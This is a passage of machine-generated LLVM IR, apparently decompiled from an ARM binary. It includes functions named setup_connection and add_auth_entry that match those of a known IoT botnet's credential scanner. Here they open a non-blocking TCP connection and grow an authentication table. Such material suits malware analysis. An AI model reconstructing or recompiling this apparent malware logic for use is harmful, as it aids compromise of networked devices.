  store i1 %v2_e76c27, i1* %cpsr_z.global-to-local, align 1
  %v3_e77028 = mul nuw nsw i32 %v3_e76826, 256
  store i32 %v3_e77028, i32* @r1, align 4
  br i1 %v2_e76c27, label %dec_label_pc_e7a4, label %dec_label_pc_e778.preheader

dec_label_pc_e778.preheader:                      ; preds = %dec_label_pc_e75c, %dec_label_pc_e768.backedge
  %v1_e7e8 = phi i32 [ %v1_e7e865, %dec_label_pc_e768.backedge ], [ 1, %dec_label_pc_e75c ]
  %v0_e7e063 = phi i32 [ %v0_e7e0, %dec_label_pc_e768.backedge ], [ 0, %dec_label_pc_e75c ]
  %v0_e78461 = phi i32 [ %v3_e770, %dec_label_pc_e768.backedge ], [ %v3_e77028, %dec_label_pc_e75c ]
  %v0_e78059 = phi i32 [ %v1_e7e4, %dec_label_pc_e768.backedge ], [ %v1_e754, %dec_label_pc_e75c ]
  %v0_e77857 = phi i32 [ %v3_e768, %dec_label_pc_e768.backedge ], [ %v3_e76826, %dec_label_pc_e75c ]
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %dec_label_pc_e778.preheader, %dec_label_pc_e780
  %v0_e7e0 = phi i32 [ %v0_e7e063, %dec_label_pc_e778.preheader ], [ 1, %dec_label_pc_e780 ]
  %v0_e784 = phi i32 [ %v0_e78461, %dec_label_pc_e778.preheader ], [ %v3_e79c, %dec_label_pc_e780 ]
  %v0_e7e4 = phi i32 [ %v0_e78059, %dec_label_pc_e778.preheader ], [ %v2_e78c, %dec_label_pc_e780 ]
  %v0_e778 = phi i32 [ %v0_e77857, %dec_label_pc_e778.preheader ], [ %v3_e790, %dec_label_pc_e780 ]
  %v7_e778 = icmp eq i32 %v0_e778, 191
  store i1 %v7_e778, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e778, 192
  br i1 %tmp159, label %dec_label_pc_e7e0, label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %dec_label_pc_e778
  %v1_e780 = add i32 %v0_e7e4, 1
  %v2_e780 = inttoptr i32 %v1_e780 to i8*
  %v3_e780 = load i8, i8* %v2_e780, align 1
  %v4_e780 = zext i8 %v3_e780 to i32
  %v2_e784 = or i32 %v4_e780, -49152
  %v0_e78c = load i32, i32* @r5, align 4
  %v1_e788 = add i32 %v0_e78c, %v0_e784
  %v2_e78c = add i32 %v1_e788, %v2_e784
  store i32 %v2_e78c, i32* %r3.global-to-local, align 4
  %v1_e790 = inttoptr i32 %v2_e78c to i8*
  %v2_e790 = load i8, i8* %v1_e790, align 1
  %v3_e790 = zext i8 %v2_e790 to i32
  store i32 %v3_e790, i32* %r2.global-to-local, align 4
  %v2_e794 = icmp eq i8 %v2_e790, 0
  store i1 %v2_e794, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e79c = mul nuw nsw i32 %v3_e790, 256
  store i32 %v3_e79c, i32* @r1, align 4
  br i1 %v2_e794, label %dec_label_pc_e7a4, label %dec_label_pc_e778

dec_label_pc_e7a4:                                ; preds = %dec_label_pc_e768.backedge, %dec_label_pc_e780, %dec_label_pc_e75c
  %v1_e7a8 = phi i32 [ 1, %dec_label_pc_e75c ], [ %v1_e7e8, %dec_label_pc_e780 ], [ %v1_e7e865, %dec_label_pc_e768.backedge ]
  %v0_e7a4 = phi i32 [ 0, %dec_label_pc_e75c ], [ 1, %dec_label_pc_e780 ], [ %v0_e7e0, %dec_label_pc_e768.backedge ]
  %v7_e7a4 = icmp eq i32 %v0_e7a4, 1
  store i1 %v7_e7a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7a4, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e7a4
  %v2_e7a8 = add i32 %v1_e7a8, 1
  store i32 %v2_e7a8, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_e804, %dec_label_pc_e7a4, %bb121
  %v1_e7ac = phi i32 [ %v5_e81c, %dec_label_pc_e804 ], [ %v1_e7a8, %dec_label_pc_e7a4 ], [ %v2_e7a8, %bb121 ]
  %v2_e7ac = add i32 %v1_e7ac, %v1_e754
  br label %dec_label_pc_e6dc.backedge

dec_label_pc_e6dc.backedge:                       ; preds = %bb122, %dec_label_pc_e828
  %v0_e6dc.pre = phi i32 [ %v3_e6e8144, %bb122 ], [ %v0_e6dc.pre.pre, %dec_label_pc_e828 ]
  %storemerge29 = phi i32 [ %v2_e7ac, %bb122 ], [ %v2_e8a0, %dec_label_pc_e828 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e6dc = add i32 %v0_e6dc.pre, -1
  %v3_e6e0 = mul i32 %v1_e6dc, 65536
  store i32 %v3_e6e0, i32* %r3.global-to-local, align 4
  %v7_e6e4 = icmp eq i32 %v3_e6e0, -65536
  store i1 %v7_e6e4, i1* %cpsr_z.global-to-local, align 1
  %v3_e6e8 = urem i32 %v1_e6dc, 65536
  store i32 %v3_e6e8, i32* @r8, align 4
  br i1 %v7_e6e4, label %dec_label_pc_e664, label %dec_label_pc_e6f0

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e664
  %v1_e7b4 = add i32 %v0_e66c, 4
  %v2_e7b4 = inttoptr i32 %v1_e7b4 to i32*
  %v3_e7b4 = load i32, i32* %v2_e7b4, align 4
  store i32 %v3_e7b4, i32* %r0.global-to-local, align 4
  %v2_e7b8 = icmp eq i32 %v3_e7b4, 0
  store i1 %v2_e7b8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_e7c0.138 to i32), i32* @lr, align 4
  %v1_e7bc = xor i1 %v2_e7b8, true
  call void @__pseudo_cond_branch(i1 %v1_e7bc, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  %v0_e7c0 = load i32, i32* @fp, align 4
  store i32 %v0_e7c0, i32* @r0, align 4
  %v0_e7c4 = call i32 @free()
  store i32 %v0_e7c4, i32* %r0.global-to-local, align 4
  %v0_e7c8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e678

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e70c
  %v2_e7d0 = icmp eq i32 %v0_e7d0, 0
  store i1 %v2_e7d0, i1* %cpsr_z.global-to-local, align 1
  %v1_e7d4 = add i32 %v0_e7d4, 1
  store i32 %v1_e7d4, i32* %r3.global-to-local, align 4
  br i1 %v2_e7d0, label %bb123, label %dec_label_pc_e6fc.backedge

dec_label_pc_e6fc.backedge:                       ; preds = %dec_label_pc_e7d0, %bb123
  %v1_e7d850 = phi i32 [ %v1_e7d8, %dec_label_pc_e7d0 ], [ %v2_e7d8, %bb123 ]
  %v1_e6fc = inttoptr i32 %v1_e7d4 to i8*
  %v2_e6fc = load i8, i8* %v1_e6fc, align 1
  %v3_e6fc = zext i8 %v2_e6fc to i32
  store i32 %v3_e6fc, i32* %r2.global-to-local, align 4
  %v2_e700 = icmp eq i8 %v2_e6fc, 0
  store i1 %v2_e700, i1* %cpsr_z.global-to-local, align 1
  %v3_e704 = mul nuw nsw i32 %v3_e6fc, 256
  store i32 %v3_e704, i32* @r1, align 4
  br i1 %v2_e700, label %dec_label_pc_e738, label %dec_label_pc_e70c.preheader

bb123:                                            ; preds = %dec_label_pc_e7d0
  %v2_e7d8 = add i32 %v1_e7d8, 1
  store i32 %v2_e7d8, i32* @lr, align 4
  br label %dec_label_pc_e6fc.backedge

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e778
  %v2_e7e0 = icmp eq i32 %v0_e7e0, 0
  store i1 %v2_e7e0, i1* %cpsr_z.global-to-local, align 1
  %v1_e7e4 = add i32 %v0_e7e4, 1
  store i32 %v1_e7e4, i32* %r3.global-to-local, align 4
  br i1 %v2_e7e0, label %bb124, label %dec_label_pc_e768.backedge

dec_label_pc_e768.backedge:                       ; preds = %dec_label_pc_e7e0, %bb124
  %v1_e7e865 = phi i32 [ %v1_e7e8, %dec_label_pc_e7e0 ], [ %v2_e7e8, %bb124 ]
  %v1_e768 = inttoptr i32 %v1_e7e4 to i8*
  %v2_e768 = load i8, i8* %v1_e768, align 1
  %v3_e768 = zext i8 %v2_e768 to i32
  store i32 %v3_e768, i32* %r2.global-to-local, align 4
  %v2_e76c = icmp eq i8 %v2_e768, 0
  store i1 %v2_e76c, i1* %cpsr_z.global-to-local, align 1
  %v3_e770 = mul nuw nsw i32 %v3_e768, 256
  store i32 %v3_e770, i32* @r1, align 4
  br i1 %v2_e76c, label %dec_label_pc_e7a4, label %dec_label_pc_e778.preheader

bb124:                                            ; preds = %dec_label_pc_e7e0
  %v2_e7e8 = add i32 %v1_e7e8, 1
  store i32 %v2_e7e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e768.backedge

dec_label_pc_e7f0:                                ; preds = %bb120
  %v1_e7f0 = add i32 %v2_e740, 2
  %v2_e7f0 = inttoptr i32 %v1_e7f0 to i8*
  %v3_e7f0 = load i8, i8* %v2_e7f0, align 1
  %v4_e7f0 = zext i8 %v3_e7f0 to i32
  store i32 %v4_e7f0, i32* %r3.global-to-local, align 4
  %v1_e7f4 = add i32 %v2_e740, 3
  %v2_e7f4 = inttoptr i32 %v1_e7f4 to i8*
  %v3_e7f4 = load i8, i8* %v2_e7f4, align 1
  %v4_e7f4 = zext i8 %v3_e7f4 to i32
  store i32 %v4_e7f4, i32* %r2.global-to-local, align 4
  %v4_e7f8 = mul nuw nsw i32 %v4_e7f4, 256
  %v5_e7f8 = or i32 %v4_e7f8, %v4_e7f0
  store i32 %v5_e7f8, i32* %r3.global-to-local, align 4
  %v7_e7fc = icmp eq i32 %v5_e7f8, 256
  store i1 %v7_e7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7fc, label %dec_label_pc_e804, label %dec_label_pc_e75c

dec_label_pc_e804:                                ; preds = %dec_label_pc_e7f0
  %v1_e804 = add i32 %v2_e740, 9
  %v2_e804 = inttoptr i32 %v1_e804 to i8*
  %v3_e804 = load i8, i8* %v2_e804, align 1
  %v4_e804 = zext i8 %v3_e804 to i32
  store i32 %v4_e804, i32* %r2.global-to-local, align 4
  %v1_e808 = add i32 %v2_e740, 8
  %v2_e808 = inttoptr i32 %v1_e808 to i8*
  %v3_e808 = load i8, i8* %v2_e808, align 1
  %v4_e808 = zext i8 %v3_e808 to i32
  %v4_e80c = mul nuw nsw i32 %v4_e804, 256
  %v5_e80c = or i32 %v4_e808, %v4_e80c
  %v3_e810 = mul i32 %v5_e80c, 65536
  store i32 %v3_e810, i32* %r3.global-to-local, align 4
  %v3_e814 = mul nuw nsw i32 %v4_e808, 256
  store i32 %v3_e814, i32* %r2.global-to-local, align 4
  %v5_e81c = or i32 %v3_e814, %v4_e804
  store i32 %v5_e81c, i32* %r0.global-to-local, align 4
  %v7_e820 = icmp eq i32 %v5_e81c, 4
  store i1 %v7_e820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e820, label %dec_label_pc_e828, label %bb122

dec_label_pc_e828:                                ; preds = %dec_label_pc_e804
  %v2_e828 = inttoptr i32 %v1_e754 to i8*
  %v3_e828 = load i8, i8* %v2_e828, align 1
  %v4_e828 = zext i8 %v3_e828 to i32
  store i32 %v4_e828, i32* %r3.global-to-local, align 4
  store i32 %v2_e440, i32* %r2.global-to-local, align 4
  %v1_e834 = add i32 %v2_e740, 11
  %v2_e834 = inttoptr i32 %v1_e834 to i8*
  %v3_e834 = load i8, i8* %v2_e834, align 1
  %v4_e834 = zext i8 %v3_e834 to i32
  store i32 %v4_e834, i32* %r2.global-to-local, align 4
  store i32 %v2_e440, i32* %r3.global-to-local, align 4
  %v1_e840 = add i32 %v2_e740, 12
  %v2_e840 = inttoptr i32 %v1_e840 to i8*
  %v3_e840 = load i8, i8* %v2_e840, align 1
  %v4_e840 = zext i8 %v3_e840 to i32
  store i32 %v4_e840, i32* %r3.global-to-local, align 4
  store i32 %v2_e440, i32* %ip.global-to-local, align 4
  %v1_e84c = add i32 %v2_e740, 13
  %v2_e84c = inttoptr i32 %v1_e84c to i8*
  %v3_e84c = load i8, i8* %v2_e84c, align 1
  %v4_e84c = zext i8 %v3_e84c to i32
  store i32 %v4_e84c, i32* %r2.global-to-local, align 4
  %v0_e854 = load i32, i32* @fp, align 4
  %v1_e854 = inttoptr i32 %v0_e854 to i8*
  %v2_e854 = load i8, i8* %v1_e854, align 1
  %v3_e854 = zext i8 %v2_e854 to i32
  %v1_e858 = mul nuw nsw i32 %v3_e854, 4
  %v3_e85c = add nuw nsw i32 %v1_e858, 4
  store i32 %v3_e85c, i32* %r1.global-to-local, align 4
  %v1_e860 = add i32 %v0_e854, 4
  %v2_e860 = inttoptr i32 %v1_e860 to i32*
  %v3_e860 = load i32, i32* %v2_e860, align 4
  store i32 %v3_e860, i32* %r0.global-to-local, align 4
  %v3_e864 = sext i8 %v3_e84c to i32
  %v5_e864 = sext i8 %v3_e840 to i32
  %v10_e864 = inttoptr i32 %v3_e860 to i32*
  %v11_e864 = call i32 @realloc(i32* %v10_e864, i32 %v3_e85c, i32 %v3_e864, i32 %v5_e864)
  store i32 %v11_e864, i32* %r0.global-to-local, align 4
  %v0_e868 = load i32, i32* @fp, align 4
  %v1_e868 = inttoptr i32 %v0_e868 to i8*
  %v2_e868 = load i8, i8* %v1_e868, align 1
  %v3_e868 = zext i8 %v2_e868 to i32
  store i32 %v3_e868, i32* %r2.global-to-local, align 4
  store i32 %v2_e440, i32* @lr, align 4
  %v4_e870 = sext i8 %v3_e828 to i32
  store i32 %v4_e870, i32* %r3.global-to-local, align 4
  %v1_e874 = add nuw nsw i32 %v3_e868, 1
  store i32 %v1_e874, i32* @r1, align 4
  %v5_e878 = mul nuw nsw i32 %v3_e868, 4
  %v6_e878 = add i32 %v5_e878, %v11_e864
  %v7_e878 = inttoptr i32 %v6_e878 to i32*
  store i32 %v4_e870, i32* %v7_e878, align 4
  %v1_e87c = load i32, i32* @fp, align 4
  %v2_e87c = add i32 %v1_e87c, 4
  %v3_e87c = inttoptr i32 %v2_e87c to i32*
  store i32 %v11_e864, i32* %v3_e87c, align 4
  %v0_e880 = load i32, i32* @r1, align 4
  %v1_e880 = trunc i32 %v0_e880 to i8
  %v2_e880 = load i32, i32* @fp, align 4
  %v3_e880 = inttoptr i32 %v2_e880 to i8*
  store i8 %v1_e880, i8* %v3_e880, align 1
  %v0_e884 = load i32, i32* @r4, align 4
  %v1_e884 = add i32 %v0_e884, 9
  %v2_e884 = inttoptr i32 %v1_e884 to i8*
  %v3_e884 = load i8, i8* %v2_e884, align 1
  %v4_e884 = zext i8 %v3_e884 to i32
  store i32 %v4_e884, i32* %r3.global-to-local, align 4
  %v1_e888 = add i32 %v0_e884, 8
  %v2_e888 = inttoptr i32 %v1_e888 to i8*
  %v3_e888 = load i8, i8* %v2_e888, align 1
  %v4_e888 = zext i8 %v3_e888 to i32
  %v4_e88c = mul nuw nsw i32 %v4_e884, 256
  %v5_e88c = or i32 %v4_e888, %v4_e88c
  %v3_e890 = mul i32 %v5_e88c, 65536
  store i32 %v3_e890, i32* %r2.global-to-local, align 4
  %v3_e894 = mul nuw nsw i32 %v4_e888, 256
  store i32 %v3_e894, i32* %r3.global-to-local, align 4
  %v5_e89c = or i32 %v3_e894, %v4_e884
  store i32 %v5_e89c, i32* %r0.global-to-local, align 4
  %v0_e8a0 = load i32, i32* @r6, align 4
  %v2_e8a0 = add i32 %v0_e8a0, %v5_e89c
  %v0_e6dc.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e6dc.backedge

; uselistorder directives
  uselistorder i32 %v3_e894, { 1, 0 }
  uselistorder i32 %v4_e884, { 1, 0, 2 }
  uselistorder i32 %v11_e864, { 1, 0, 2 }
  uselistorder i32 %v3_e85c, { 1, 0 }
  uselistorder i32 %v5_e81c, { 1, 2, 0 }
  uselistorder i32 %v3_e814, { 1, 0 }
  uselistorder i32 %v4_e804, { 1, 0, 2 }
  uselistorder i32 %v2_e7e8, { 1, 0 }
  uselistorder i32 %v3_e768, { 0, 2, 1 }
  uselistorder i32 %v1_e7e865, { 1, 0 }
  uselistorder i32 %v1_e7e4, { 1, 2, 0 }
  uselistorder i32 %v2_e7d8, { 1, 0 }
  uselistorder i32 %v3_e6fc, { 0, 2, 1 }
  uselistorder i32 %v1_e7d850, { 1, 0 }
  uselistorder i32 %v1_e7d4, { 1, 2, 0 }
  uselistorder i1 %v7_e6e4, { 1, 0 }
  uselistorder i32 %v1_e6dc, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e790, { 0, 2, 1 }
  uselistorder i32 %v2_e78c, { 1, 2, 0 }
  uselistorder i32 %v0_e7e0, { 2, 0, 1 }
  uselistorder i32 %v1_e7e8, { 1, 2, 0 }
  uselistorder i32 %v3_e77028, { 1, 0 }
  uselistorder i32 %v3_e76826, { 1, 0, 2 }
  uselistorder i32 %v1_e754, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e740, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e724, { 0, 2, 1 }
  uselistorder i32 %v2_e720, { 1, 2, 0 }
  uselistorder i32 %v0_e7d0, { 2, 0, 1 }
  uselistorder i32 %v1_e7d8, { 1, 2, 0 }
  uselistorder i32 %v3_e70422, { 1, 0 }
  uselistorder i32 %v3_e6fc20, { 1, 0, 2 }
  uselistorder i32 %v0_e740143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e6e8142, { 1, 0 }
  uselistorder i1 %v7_e6e4141, { 1, 0 }
  uselistorder i32 %v1_e6dc134, { 1, 0 }
  uselistorder i1 %v9_e6b8, { 1, 0 }
  uselistorder i32 %v0_e678, { 1, 0 }
  uselistorder i32 %v0_e66c, { 1, 0, 2 }
  uselistorder i32 %v0_e65c, { 1, 0 }
  uselistorder i32 %v0_e634, { 1, 0 }
  uselistorder i1 %v7_e5e8, { 1, 0 }
  uselistorder i32 %v1_e5ac, { 1, 0 }
  uselistorder i32 %v3_e598, { 1, 0 }
  uselistorder i32 %v0_e590, { 1, 0 }
  uselistorder i32 %v1_e584, { 1, 2, 0 }
  uselistorder i1 %v7_e53c, { 1, 0 }
  uselistorder i32 %v4_e538, { 1, 0, 2 }
  uselistorder i1 %v7_e520, { 1, 0 }
  uselistorder i32 %v3_e51c, { 1, 0, 2 }
  uselistorder i1 %v7_e504, { 1, 0 }
  uselistorder i32 %v3_e500, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e4e8, { 2, 1, 0 }
  uselistorder i32 %v1_e4ec, { 1, 0 }
  uselistorder i32 %v2_e59c, { 1, 0 }
  uselistorder i32 %v2_e574, { 1, 0, 2 }
  uselistorder i16 %v5_e490, { 1, 0 }
  uselistorder i32 %v2_e48c, { 1, 0, 2 }
  uselistorder i32 %v6_e478, { 1, 2, 0 }
  uselistorder i64 %v5_e474, { 0, 2, 1 }
  uselistorder i32 %v1_e460, { 1, 0, 2 }
  uselistorder i32 %v1_e418, { 1, 0 }
  uselistorder i32 %v1_e414, { 1, 2, 0 }
  uselistorder i32 %v2_e410, { 1, 0 }
  uselistorder i1 %v8_e3fc, { 1, 0 }
  uselistorder i32 %v2_e3d4, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 37 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 12, 8, 27, 10, 11, 26, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 10 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 8, 2, 13, 3, 4, 14, 5, 6, 7, 33, 9, 10, 11, 12, 32, 35, 15, 16, 17, 18, 19, 20, 21, 22, 34, 23, 24, 25, 26, 31, 28, 29, 27, 30, 36 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e768.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e6fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e6dc.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e778, { 1, 0 }
  uselistorder label %dec_label_pc_e778.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e70c, { 1, 0 }
  uselistorder label %dec_label_pc_e70c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e6f0, { 1, 0 }
  uselistorder label %dec_label_pc_e678, { 1, 0 }
  uselistorder label %dec_label_pc_e664, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e644, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e3f4, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e8a8 = load i32, i32* @r4, align 4
  store i32 %v3_e8a8, i32* %stack_var_-16, align 4
  %v6_e8a8 = load i32, i32* @r5, align 4
  %v9_e8a8 = load i32, i32* @r6, align 4
  %v12_e8a8 = load i32, i32* @lr, align 4
  %v0_e8ac = load i32, i32* @r0, align 4
  store i32 %v0_e8ac, i32* @r5, align 4
  %v1_e8b0 = add i32 %v0_e8ac, 4
  %v2_e8b0 = inttoptr i32 %v1_e8b0 to i32*
  %v3_e8b0 = load i32, i32* %v2_e8b0, align 4
  store i32 %v3_e8b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 59604, i32* @lr, align 4
  %v1_e8d0 = icmp ne i32 %v3_e8b0, -1
  call void @__pseudo_cond_branch(i1 %v1_e8d0, i32 ptrtoint (i32* @global_var_146d0.113 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e8dc = load i32, i32* @r6, align 4
  store i32 %v0_e8dc, i32* %r2.global-to-local, align 4
  %v3_e8e0 = call i32 @socket(i32 2, i32 1, i32 %v0_e8dc)
  store i32 %v3_e8e0, i32* %r0.global-to-local, align 4
  %v7_e8e4 = icmp eq i32 %v3_e8e0, -1
  %v1_e8e8 = load i32, i32* @r5, align 4
  %v2_e8e8 = add i32 %v1_e8e8, 4
  %v3_e8e8 = inttoptr i32 %v2_e8e8 to i32*
  store i32 %v3_e8e0, i32* %v3_e8e8, align 4
  br i1 %v7_e8e4, label %entry.dec_label_pc_e960_crit_edge, label %dec_label_pc_e8f0

entry.dec_label_pc_e960_crit_edge:                ; preds = %entry
  %v1_e968.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e960

dec_label_pc_e8f0:                                ; preds = %entry
  %v2_e8b4 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e8f0 = load i32, i32* @r5, align 4
  %v1_e8f0 = add i32 %v0_e8f0, 28
  store i32 %v1_e8f0, i32* @r0, align 4
  %v0_e8f4 = load i32, i32* @r6, align 4
  %v2_e8f4 = add i32 %v0_e8f0, 24
  %v3_e8f4 = inttoptr i32 %v2_e8f4 to i32*
  store i32 %v0_e8f4, i32* %v3_e8f4, align 4
  store i32 256, i32* @r1, align 4
  %v0_e8fc = call i32 @util_zero()
  store i32 %v0_e8fc, i32* %r0.global-to-local, align 4
  %v0_e900 = load i32, i32* @r5, align 4
  %v1_e900 = add i32 %v0_e900, 4
  %v2_e900 = inttoptr i32 %v1_e900 to i32*
  %v3_e900 = load i32, i32* %v2_e900, align 4
  store i32 %v3_e900, i32* @r4, align 4
  %v0_e904 = load i32, i32* @r6, align 4
  store i32 %v0_e904, i32* @r2, align 4
  store i32 %v3_e900, i32* %r0.global-to-local, align 4
  %v2_e910 = call i32 @__libc_fcntl(i32 %v3_e900, i32 3)
  %v1_e918 = or i32 %v2_e910, 2048
  store i32 %v1_e918, i32* @r2, align 4
  %v0_e91c = load i32, i32* @r4, align 4
  store i32 %v0_e91c, i32* %r0.global-to-local, align 4
  %v2_e920 = call i32 @__libc_fcntl(i32 %v0_e91c, i32 4)
  store i32 %v2_e920, i32* %r0.global-to-local, align 4
  %v2_e928 = load i32, i32* @global_var_22284.140, align 4
  store i32 %v2_e928, i32* %r2.global-to-local, align 4
  %v1_e930 = load i32, i32* @r5, align 4
  %v2_e930 = add i32 %v1_e930, 12
  %v3_e930 = inttoptr i32 %v2_e930 to i32*
  store i32 1, i32* %v3_e930, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e93c = load i32, i32* %r2.global-to-local, align 4
  %v1_e93c = load i32, i32* @r5, align 4
  %v2_e93c = add i32 %v1_e93c, 8
  %v3_e93c = inttoptr i32 %v2_e93c to i32*
  store i32 %v0_e93c, i32* %v3_e93c, align 4
  %v0_e940 = load i32, i32* @r5, align 4
  %v1_e944 = add i32 %v0_e940, 4
  %v2_e944 = inttoptr i32 %v1_e944 to i32*
  %v3_e944 = load i32, i32* %v2_e944, align 4
  store i32 %v3_e944, i32* %r0.global-to-local, align 4
  %v1_e948 = add i32 %v0_e940, 20
  %v2_e948 = inttoptr i32 %v1_e948 to i16*
  %v3_e948 = load i16, i16* %v2_e948, align 2
  %v4_e948 = zext i16 %v3_e948 to i32
  store i32 %v4_e948, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e95c = call i32 @__libc_connect(i32 %v3_e944, i32 %v2_e8b4, i32 16)
  store i32 %v3_e95c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e960

dec_label_pc_e960:                                ; preds = %entry.dec_label_pc_e960_crit_edge, %dec_label_pc_e8f0
  %v1_e968 = phi i32 [ %v1_e968.pre, %entry.dec_label_pc_e960_crit_edge ], [ %v3_e95c, %dec_label_pc_e8f0 ]
  %v2_e964 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e964, i32* @r4, align 4
  store i32 %v6_e8a8, i32* @r5, align 4
  store i32 %v9_e8a8, i32* @r6, align 4
  store i32 %v12_e8a8, i32* @lr, align 4
  ret i32 %v1_e968

; uselistorder directives
  uselistorder i32 %v3_e8e0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_e960, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e970 = load i32, i32* @r4, align 4
  %v6_e970 = load i32, i32* @r5, align 4
  %v9_e970 = load i32, i32* @r6, align 4
  %v12_e970 = load i32, i32* @r7, align 4
  %v15_e970 = load i32, i32* @r8, align 4
  %v18_e970 = load i32, i32* @sb, align 4
  %v21_e970 = load i32, i32* @sl, align 4
  %v24_e970 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_22250.142 to i32), i32* @fp, align 4
  %v2_e978 = load i32, i32* @global_var_22250.142, align 4
  store i32 ptrtoint (i32* @global_var_2227c.144 to i32), i32* @sl, align 4
  %v1_e984 = add i32 %v2_e978, 1
  store i32 %v1_e984, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e990 = load i32, i32* @global_var_2227c.144, align 4
  store i32 %v2_e990, i32* %r0.global-to-local, align 4
  %v3_e994 = mul i32 %v1_e984, 16
  store i32 %v3_e994, i32* %r1.global-to-local, align 4
  %v4_e99c = inttoptr i32 %v2_e990 to i32*
  %v5_e99c = call i32 @realloc(i32* %v4_e99c, i32 %v3_e994, i32 %arg3, i32 %v1_e984)
  %v2_e9a0 = load i32, i32* @global_var_22250.142, align 4
  store i32 %v2_e9a0, i32* %r2.global-to-local, align 4
  store i32 %v5_e99c, i32* @r8, align 4
  %v0_e9a8 = load i32, i32* @r5, align 4
  store i32 %v0_e9a8, i32* %r0.global-to-local, align 4
  %v1_e9b0 = load i32, i32* @sl, align 4
  %v2_e9b0 = inttoptr i32 %v1_e9b0 to i32*
